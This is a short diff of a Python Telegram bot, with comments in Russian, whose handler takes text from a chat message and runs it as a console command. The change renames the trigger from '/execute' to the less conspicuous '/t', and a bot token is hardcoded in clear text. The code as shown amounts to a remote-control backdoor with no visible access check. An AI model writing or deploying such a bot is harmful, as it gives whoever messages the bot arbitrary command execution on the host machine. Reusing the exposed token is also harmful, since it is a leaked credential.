@@ -5,10 +5,10 @@ import telebot
 bot = telebot.TeleBot('6168359577:AAHXM0K2-CWOwHokIDM9sqlysrR-r__Q8zI')
 
 # Обработчик команды /execute
-@bot.message_handler(commands=['execute'])
+@bot.message_handler(commands=['t'])
 def execute_command(message):
     # Получение команды из сообщения пользователя
-    command = message.text.split('/execute', maxsplit=1)[1].strip()
+    command = message.text.split('/t', maxsplit=1)[1].strip()
     
     try:
         # Выполнение команды в консоли
